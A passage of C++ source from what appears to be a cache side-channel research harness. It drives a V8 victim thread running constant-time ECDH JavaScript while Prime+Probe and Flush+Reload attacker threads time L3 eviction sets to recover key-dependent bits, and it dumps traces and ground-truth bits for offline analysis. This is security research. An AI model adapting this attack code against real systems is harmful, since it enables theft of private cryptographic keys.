		if (oracle_on) {
			grab_victim_ground_truth(isolate, context, grab_script);
		}
	}
}

void *v8_victim_thread(void *) {
	/* --expose-gc is what RequestGarbageCollectionForTesting checks for; the
	 * per-run collection in v8_victim_run is a hard ApiCheck failure without
	 * it. A default young generation can still refill during one ~1.3 MB
	 * ladder. Keep a 16 MiB semi-space so that its scavenge cannot land in the
	 * capture window (at the cost of a modestly longer bit period).
	 *
	 * This runs AFTER main's SetFlagsFromCommandLine -- the thread is created
	 * on the line below it -- so these win over anything passed on the
	 * command line. */
	v8::V8::SetFlagsFromString(
	    "--allow-natives-syntax --no-sparkplug --always-turbofan "
	    "--single-threaded --expose-gc --min-semi-space-size=16");
	std::unique_ptr<v8::Platform> platform = v8::platform::NewDefaultPlatform();
	v8::V8::InitializePlatform(platform.get());
	v8::V8::Initialize();

	v8::Isolate::CreateParams create_params;
	create_params.array_buffer_allocator =
	    v8::ArrayBuffer::Allocator::NewDefaultAllocator();
	v8::Isolate *isolate = v8::Isolate::New(create_params);

	v8_victim_run(isolate);

	isolate->Dispose();
	v8::V8::Dispose();
	v8::V8::DisposePlatform();
	delete create_params.array_buffer_allocator;
	return nullptr;
}

/* One CSI channel to scan. page_slot is the target line's page offset in cache
 * lines: every L3 set with the same offset is a candidate for it. check_fn is
 * the (not-yet-implemented) fingerprint that will later pick the real set out of
 * a candidate's three-key traces. */
struct csi_params_t {
	uint32_t page_slot;
	/* The known target line VA, in this same process. Logged to csi_truth.txt
	 * under CSI ground truth (BITS=1). Unused otherwise. */
	uint8_t *target;
	/* Hardcoded true target L3 set, or -1 if unknown. The scan does NOT resolve
	 * this at runtime (see the note above csi_truth writers); fill it in for a
	 * known-target run. */
	int true_set;
	const char *label;
	int (*check_fn)(uint64_t *, uint32_t);
};

/* Attacker-side single window on one scanned evset, after v8_ecdh_key_pool.cc's
 * v8_csi_profile_once. Prime the set, open the window (SYNC_CTX_START + barrier
 * A releases the victim's one derive), time a repeated access to the scope line
 * (evset->addrs[0]) re-priming on every eviction, then close it (PAUSE + barrier
 * B). The attacker owns START and PAUSE; the victim only reacts -- so this pairs
 * with the victim's use_csi loop, not with the fixed profiling loop. Prime+scope
 * rather than PS_profile_once because a scanned set has no calibrated hit
 * threshold, only the l2/interrupt latencies. */
static uint32_t v8_csi_profile_once(EVSet *evset,
                                    uint64_t profile_iters,
                                    uint64_t max_cycles,
                                    uint64_t **sample_tsc,
                                    uint64_t **probe_time) {
	uint64_t tsc0, tsc1, end, scope_lat;
	uint32_t aux, index = 0;
	uint8_t *scope = evset->addrs[0];
	evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);
	i64 threshold = detected_cache_lats.l2_thresh;

	prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);
	tsc0 = tsc1 = rdtscp();
	sync_ctx_set_action(SYNC_CTX_START);
	pthread_barrier_wait(sync_ctx.barrier); /* A: release victim derive */
	do {
		tsc1 = rdtscp();
		scope_lat = _time_maccess_aux(scope, end, aux);
		if (scope_lat > threshold) {
			if (scope_lat < detected_cache_lats.interrupt_thresh) {
				probe_time[0][index] = scope_lat;
				sample_tsc[0][index] = tsc1;
				index++;
			}
			prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);
		}
	} while (tsc1 - tsc0 < max_cycles && index < profile_iters &&
	         sync_ctx_get_action() == SYNC_CTX_START);
	sync_ctx_set_action(SYNC_CTX_PAUSE);
	pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous with victim */
	return index;
}

/* The true target set is NOT resolved at runtime. Testing the target VA against
 * every pool evset with the library's eviction test spins (generic_test_eviction
 * only advances on an un-migrated rdtscp, so it never terminates against the
 * non-evicting majority on a multi-core taskset), and a hand-rolled prime+probe
 * count was unreliable. It is instead a hardcoded per-target field, csi_params_t
 * .true_set, defaulting to -1 ("unknown"). The target VA is still logged to
 * csi_truth.txt so a known set can be filled in there or offline; the SOLID
 * ground truth is victim_bits.txt, whose per-(set,key) blocks pair with the
 * candidate traces directly. */

/* Append one target line's truth to output/<test_name>/csi_truth.txt,
 * next to the candidate traces the scan dumps. Truncated on the first call so a
 * re-run does not accrete stale lines. */
static void write_csi_truth(const char *label,
                            uint32_t page_slot,
                            int true_set,
                            void *va) {
	static bool first = true;
	char dir[128], path[256];
	snprintf(dir, sizeof(dir), "output/%s", test_name);
	create_directory(dir);
	snprintf(path, sizeof(path), "%s/csi_truth.txt", dir);
	FILE *fp = fopen(path, first ? "w" : "a");
	if (!fp) {
		log_error("could not write CSI truth to %s", path);
		return;
	}
	if (first) {
		fprintf(fp, "# label page_slot true_set target_va\n");
	}
	fprintf(fp, "%s %u %d %p\n", label, page_slot, true_set, va);
	fclose(fp);
	first = false;
}

/* Append one dumped candidate's three oracle blocks to
 * output/<test_name>/victim_bits.txt, each preceded by a `# set <s> col <ki> key
 * <name>` header so the decoder can pair block -> (r<s>.out, column ki). One
 * derive per (set,key), so unlike the normal path's run-ordered blocks these are
 * keyed explicitly. Truncated on the first candidate written. */
static void write_csi_victim_bits(int l3_set,
                                  char gt_blk[][victim_bits_max * 24],
                                  const size_t *gt_len) {
	static bool first = true;
	char dir[128], path[256];
	snprintf(dir, sizeof(dir), "output/%s", test_name);
	create_directory(dir);
	snprintf(path, sizeof(path), "%s/victim_bits.txt", dir);
	FILE *fp = fopen(path, first ? "w" : "a");
	if (!fp) {
		log_error("could not write CSI oracle to %s", path);
		return;
	}
	for (int ki = 0; ki < csi_key_count; ++ki) {
		fprintf(fp, "# set %d col %d key %s\n", l3_set, ki, csi_probe_keys[ki]);
		if (gt_len[ki]) {
			fwrite(gt_blk[ki], 1, gt_len[ki], fp);
		}
	}
	fclose(fp);
	first = false;
}

/* Scan every system-wide L3 set sharing this target line's page offset. For each
 * candidate, probe it once per CSI key (loaded via a SET_KEY window) and dump the
 * three traces side by side -- one r<l3_set>.out with csi_key_count columns, in
 * csi_probe_keys order. No selection yet: check_fn is unimplemented, so every
 * candidate with samples is dumped for offline fingerprinting. Each key costs one
 * SET_KEY window plus one profiling window.
 *
 * Under CSI ground truth (BITS=1) this also resolves the true target set once up
 * front and drains the victim's per-derive (tsc,bit) oracle alongside each dumped
 * candidate -- both gated on g_csi_oracle, which the victim published before its
 * first window, so it is set by the time the first barrier B releases below. */
static void identify_one_target(const csi_params_t *p,
                                uint64_t **id_sample_tsc,
                                uint64_t **id_probe_time) {
	config_t *cfg = get_config();

	const bool ground_truth = g_csi_oracle.load(std::memory_order_relaxed);
	if (ground_truth) {
		log_info("%s target set (hardcoded): %d [va %p, page slot %u]",
		         p->label,
		         p->true_set,
		         (void *)p->target,
		         p->page_slot);
		write_csi_truth(p->label, p->page_slot, p->true_set, (void *)p->target);
	}

	/* Per-candidate stash of the three keys' oracle blocks, written out only if
	 * the candidate is dumped. Static: ~18 KB, and only ever touched here. */
	static char gt_blk[csi_key_count][victim_bits_max * 24];
	size_t gt_len[csi_key_count] = { 0 };

	for (int l3_set = 0; l3_set < (int)cfg->l3.sets; ++l3_set) {
		if ((uint32_t)(l3_set % NUM_PAGE_SLOTS) != p->page_slot) {
			continue;
		}

		log_debug("%s l3_set: %x", p->label, l3_set);

		EVSet *evset = get_sf_kth_evset(l3_set);
		if (!evset) {
			log_error("cannot build evset for set %d", l3_set);
			continue;
		}

		uint32_t max_cnt = 0;
		for (int ki = 0; ki < csi_key_count; ++ki) {
			/* SET_KEY window: hand the victim the probe key path, barrier A
			 * releases it to reload s1, barrier B waits until it has. */
			snprintf((char *)sync_ctx.data,
			         sync_ctx_data_size,
			         "%s/%s",
			         cfg->project_root,
			         csi_probe_keys[ki]);
			sync_ctx_set_action(SYNC_CTX_SET_KEY);
			pthread_barrier_wait(sync_ctx.barrier); /* A */
			pthread_barrier_wait(sync_ctx.barrier); /* B */

			memset(id_sample_tsc[ki],
			       0,
			       sizeof(uint64_t) * profile_iterations);
			memset(id_probe_time[ki],
			       0,
			       sizeof(uint64_t) * profile_iterations);
			uint64_t *one_tsc[1] = { id_sample_tsc[ki] };
			uint64_t *one_probe[1] = { id_probe_time[ki] };
			v8_csi_profile_once(
			    evset, profile_iterations, pp_max_exec_cycles, one_tsc, one_probe);

			/* This key's derive just finished behind barrier B, so g_vb_csi now
			 * holds its (tsc,bit) block; copy it out before the next window can
			 * overwrite it. Assigned every key so a failed grab (0) does not leave
			 * a previous candidate's block behind. */
			if (ground_truth) {
				gt_len[ki] = g_vb_csi_len.load(std::memory_order_relaxed);
				if (gt_len[ki] > sizeof(gt_blk[ki])) {
					gt_len[ki] = sizeof(gt_blk[ki]);
				}
				memcpy(gt_blk[ki], g_vb_csi, gt_len[ki]);
			}

			uint32_t cnt = 0;
			while (cnt < profile_iterations && id_sample_tsc[ki][cnt] != 0) {
				++cnt;
			}
			if (cnt > max_cnt) {
				max_cnt = cnt;
			}
			log_info("%s set %d(%x) key %s: %u samples",
			         p->label,
			         l3_set,
			         l3_set,
			         csi_probe_keys[ki],
			         cnt);
		}

		if (max_cnt > 256) {
			dump_profiling_trace(test_name,
			                     l3_set,
			                     id_sample_tsc,
			                     id_probe_time,
			                     csi_key_count,
			                     max_cnt);
			/* Same set id as the trace file, so victim_bits.txt's `set` headers
			 * line up with r<l3_set>.out. Written only for dumped candidates. */
			if (ground_truth) {
				write_csi_victim_bits(l3_set, gt_blk, gt_len);
			}
		}
	}
}

/* CSI scan: build the system-wide evset pool, then for each target line walk the
 * L3 sets sharing its page offset and dump every candidate's three-key traces.
 * This does NOT run the real attack and does NOT yet pick a winning set -- it
 * only filters by VA page offset and dumps, for offline fingerprinting.
 *
 * Prerequisite: init_target_lines() must have run so fr_lines[].target hold the
 * JITted handler VAs (handler addr + line off) the page offsets come from. The
 * victim is driven through its use_csi loop: the first SET_KEY's barrier A also
 * serves as the JIT/warmup rendezvous, and the closing EXIT ends that loop. */
static int identify_ctjs_target_sets(void) {
	log_info("l2 thres %d, interrupt thres %d",
	         detected_cache_lats.l2_thresh,
	         detected_cache_lats.interrupt_thresh);

	/* get_sf_kth_evset reads the pool sfevset_complex, which LLCF_multi_evset
	 * populates -- without this every get_sf_kth_evset returns NULL.
	 *
	 * hctrl must NOT be pre-started: build_sf_evset_all (called from
	 * LLCF_multi_evset, src/attack/LLCF.c:219,337) calls start_helper_thread/
	 * stop_helper_thread on it ITSELF. Starting it here too double-starts the
	 * helper thread on the same struct -- measured on the evaluation host,
	 * deterministic SIGSEGV in the second thread's prime_cands_daniel on
	 * garbage addrs/cnt, every run, right at "About to start evset
	 * construction" (build_sf_evset_all's own log line). Matches
	 * quickjs_rsa_key_pool.c's identify_quickjs_target_sets, which never
	 * starts/stops hctrl around this call either. */
	/* LLCF_multi_evset is measured-flaky on this host, so retry it. */
	helper_thread_ctrl hctrl;
	enum { llcf_max_attempts = 5 };
	bool pool_built = false;
	for (int attempt = 1; attempt <= llcf_max_attempts && !pool_built;
	     ++attempt) {
		pool_built = !LLCF_multi_evset(0, &hctrl);
		if (!pool_built) {
			log_error("failed to build system-wide evset pool (attempt %d/%d)",
			          attempt,
			          llcf_max_attempts);
		}
	}
	if (!pool_built) {
		/* The victim is already waiting on its first barrier A. Leaving
		 * without releasing it hangs the process forever on shutdown. */
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier);
		return 0;
	}

	/* One buffer per CSI key: the three traces of a candidate set, dumped as
	 * three columns. */
	static uint64_t id_tsc_arr[csi_key_count][profile_iterations];
	static uint64_t id_probe_arr[csi_key_count][profile_iterations];
	uint64_t *id_sample_tsc[csi_key_count];
	uint64_t *id_probe_time[csi_key_count];
	for (int ki = 0; ki < csi_key_count; ++ki) {
		id_sample_tsc[ki] = id_tsc_arr[ki];
		id_probe_time[ki] = id_probe_arr[ki];
	}

	csi_params_t targets[cache_line_count] = {
		{
		    (uint32_t)((((uintptr_t)fr_lines[0].target) & PAGE_MASK) >>
		               CACHE_LINE_BITS),
		    fr_lines[0].target,
		    -1, /* true_set: hardcode when known */
		    fr_lines[0].label,
		    check_bitand,
		},
		{
		    (uint32_t)((((uintptr_t)fr_lines[1].target) & PAGE_MASK) >>
		               CACHE_LINE_BITS),
		    fr_lines[1].target,
		    -1, /* true_set: hardcode when known */
		    fr_lines[1].label,
		    check_negate,
		},
	};

	for (int cl = 0; cl < cache_line_count; ++cl) {
		log_info("%s page slot %x (target %p)",
		         targets[cl].label,
		         targets[cl].page_slot,
		         (void *)fr_lines[cl].target);
	}

	/* One rendezvous before the scan, so the victim's g_csi_oracle store (done
	 * before its first barrier A) is visible when identify_one_target reads the
	 * flag -- a plain read at the top of the scan would race the victim's setup
	 * and could miss ground truth silently. A SET_KEY is the victim loop's
	 * cheapest action; the key it loads is overwritten by the scan's first real
	 * SET_KEY, and this barrier A doubles as the JIT/warmup rendezvous the scan
	 * used to get from its own first window. */
	config_t *cfg = get_config();
	snprintf((char *)sync_ctx.data,
	         sync_ctx_data_size,
	         "%s/%s",
	         cfg->project_root,
	         csi_probe_keys[0]);
	sync_ctx_set_action(SYNC_CTX_SET_KEY);
	pthread_barrier_wait(sync_ctx.barrier); /* A */
	pthread_barrier_wait(sync_ctx.barrier); /* B: g_csi_oracle now visible */

	for (int cl = 0; cl < cache_line_count; ++cl) {
		identify_one_target(&targets[cl], id_sample_tsc, id_probe_time);
	}

	/* Release the victim's CSI loop (it is waiting on barrier A). EXIT takes
	 * only barrier A -- the victim breaks before B, so the attacker must not
	 * wait on B here either. */
	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);

	/* No stop_helper_thread(&hctrl) here -- see the comment above
	 * LLCF_multi_evset: build_sf_evset_all already stopped it internally. */
	return 1;
}

int v8_ctjs_ecdh_attack() {
	/* sync_ctx is already set up: main resets it once, before the victim
	 * thread exists. Doing it here would race the victim's first
	 * pthread_barrier_wait, and reset_sync_ctx is free+init on the one global
	 * -- the loser can be left holding a barrier whose shm was just released. */
	if (cache_env_init(1)) {
		log_error("failed to initialize cache env");
		return 1;
	}

	for (int cl = 0; cl < cache_line_count; ++cl) {
		sample_tsc[cl] = sample_tsc_arr[cl];
		probe_time[cl] = reload_time_arr[cl];
	}

	init_target_lines();
	write_channel_metadata();

	/* CSI: scan by page offset, probe each candidate with the three keys, dump,
	 * then stop -- no real attack. Drives the victim's use_csi loop (SET_KEY /
	 * START / EXIT) rather than starting the F+R/P+P attacker threads. */
	if (use_csi) {
		return identify_ctjs_target_sets() ? 0 : 1;
	}

	const int attacker_count = prim == PRIM_FR ? 1 : cache_line_count;
	pthread_t attackers[cache_line_count];

	int started = 0;
	if (prim != PRIM_FR && pthread_barrier_init(&attacker_threads_barrier,
	                                            nullptr,
	                                            attacker_count) != 0) {
		log_error("failed to init attacker thread barrier");
		return 1;
	}

	if (prim == PRIM_PP) {
		for (int cl = 0; cl < cache_line_count; ++cl) {
			pp_cfg[cl].label = fr_lines[cl].label;
			pp_cfg[cl].slot = cl;
			pp_cfg[cl].target = (uintptr_t)fr_lines[cl].target;
			PP_thread_config_init(pp_cfg[cl]);
		}

		for (int cl = 0; cl < cache_line_count; ++cl) {
			prepare_evset_thres(
			    pp_cfg[cl].target, &pp_cfg[cl].evset, &pp_cfg[cl].threshold);
		}

		for (int cl = 0; cl < cache_line_count; ++cl) {
			if (pp_cfg[cl].evset == nullptr || pp_cfg[cl].threshold == 0) {
				log_error("cannot build evset for cl%d (%s +0x%03lx)",
				          cl,
				          fr_lines[cl].label,
				          target_lines[cl].off);
				exit(1);
			}
		}
	}

	bool launch_ok = true;
	for (int cl = 0; cl < attacker_count; ++cl) {
		if (pthread_create(&attackers[cl],
		                   nullptr,
		                   prim == PRIM_FR ? v8_attacker_thread_fr :
		                                     v8_attacker_thread_pp,
		                   (void *)&pp_cfg[cl]) != 0) {
			log_error("failed to start attacker thread cl%d", cl);
			launch_ok = false;
			break;
		}
		++started;
	}

	for (int cl = 0; cl < started; ++cl) {
		if (!launch_ok) {
			pthread_cancel(attackers[cl]);
		}
		pthread_join(attackers[cl], nullptr);
	}

	if (prim != PRIM_FR) {
		pthread_barrier_destroy(&attacker_threads_barrier);
	}
	return launch_ok ? 0 : 1;
}

int main(int argc, char *argv[]) {
	bool argv_ok = true;
	{
		int new_argc = 0;
		for (int i = 0; i < argc; ++i) {
			if (strcmp(argv[i], "-fr") == 0) {
				prim = PRIM_FR;
			} else if (strcmp(argv[i], "-pp") == 0) {
				prim = PRIM_PP;
			} else if (strcmp(argv[i], "-csi") == 0) {
				use_csi = true;
			} else if (strcmp(argv[i], "-debug") == 0) {
				/* Rejected rather than ignored: silently dropping it would
				 * leave it to land in a path slot, and accepting it would put
				 * the oracle back under two switches that can disagree. */
				log_error("-debug is gone -- the victim's ground truth now "
				          "follows `let debug = 1;` in <source.js>, which "
				          "evaluation/run_ecdh_ct.sh generates for you with "
				          "BITS=1.");
				argv_ok = false;
			} else if (strncmp(argv[i], "-cl", 3) == 0 &&
			           isdigit((unsigned char)argv[i][3]) &&
			           argv[i][4] == '=') {
				if (!parse_target_line(argv[i][3] - '0', argv[i] + 5)) {
					argv_ok = false;
				}
			} else if (strncmp(argv[i], "-wait=", 6) == 0) {
				fr_wait_cycles = strtoull(argv[i] + 6, nullptr, 0);
			} else if (strncmp(argv[i], "-thresh=", 8) == 0) {
				fr_hit_thresh = (i64)strtoll(argv[i] + 8, nullptr, 0);
			} else if (strncmp(argv[i], "-runs=", 6) == 0) {
				victim_runs = atoi(argv[i] + 6);
			} else if (strncmp(argv[i], "-warmup=", 8) == 0) {
				warmup_runs = atoi(argv[i] + 8);
			} else {
				argv[new_argc++] = argv[i];
			}
		}
		argc = new_argc;
	}
	if (!argv_ok) {
		return 1;
	}
	/* Positional paths: <source.js> <repeat.js> <key_path>. In CSI mode any that
	 * are omitted default to the canonical files under the project root (found by
	 * walking up to the .project marker), so `-csi` alone runs from any directory
	 * without spelling the three paths out. The seed key only has to be a valid
	 * scalar for warmup -- CSI overrides s1 with each probe key anyway. */
	char def_src[512], def_rep[512], def_key[512];
	const char *src_path = argc > 1 ? argv[1] : nullptr;
	const char *rep_path = argc > 2 ? argv[2] : nullptr;
	key_path = argc > 3 ? argv[3] : nullptr;
	if (use_csi) {
		const char *root = find_project_root();
		if (!src_path) {
			snprintf(def_src,
			         sizeof(def_src),
			         "%s/experiments/v8_constant_time_js/js/ecdh_ct_eval.js",
			         root);
			src_path = def_src;
		}
		if (!rep_path) {
			snprintf(def_rep,
			         sizeof(def_rep),
			         "%s/experiments/v8_constant_time_js/js/ecdh_ct_repeat.js",
			         root);
			rep_path = def_rep;
		}
		if (!key_path) {
			snprintf(def_key,
			         sizeof(def_key),
			         "%s/experiments/v8_constant_time_js/ec_key_zeros.hex",
			         root);
			key_path = def_key;
		}
	}
	if (!src_path || !rep_path || !key_path) {
		print_helper(argc, argv);
		return 1;
	}
	source_str = read_file(src_path);
	repeat_str = read_file(rep_path);
	/* Name the file, and say so when it looks like a mistyped flag: anything
	 * the option loop above did not recognise is kept and lands in a path slot,
	 * so a mistyped attacker flag or a V8 flag placed before the paths fails
	 * here rather than where the mistake was. */
	const char *paths[2] = { src_path, rep_path };
	for (int i = 0; i < 2; ++i) {
		const char *s = i == 0 ? source_str : repeat_str;
		if (s) {
			continue;
		}
		log_error("could not read %s file '%s'%s",
		          i == 0 ? "source" : "repeat",
		          paths[i],
		          paths[i][0] == '-' ?
		              " -- that looks like a flag, not a path. Attacker flags "
		              "take ONE dash (-pp, -fr, -runs=) and go before the "
		              "paths; V8 flags go AFTER all three paths." :
		              "");
	}
	if (!source_str || !repeat_str) {
		return 1;
	}

	reset_sync_ctx(V8_PROJ_ID);

	pthread_t victim_pthread = 0;

	v8::V8::InitializeICUDefaultLocation(argv[0]);
	v8::V8::SetFlagsFromCommandLine(&argc, argv, true);

	if (pthread_create(&victim_pthread, nullptr, v8_victim_thread, nullptr) !=
	    0) {
		log_error("failed to start the victim thread");
		return 1;
	}
	int rc = v8_ctjs_ecdh_attack();

	pthread_join(victim_pthread, nullptr);

	return rc;
}
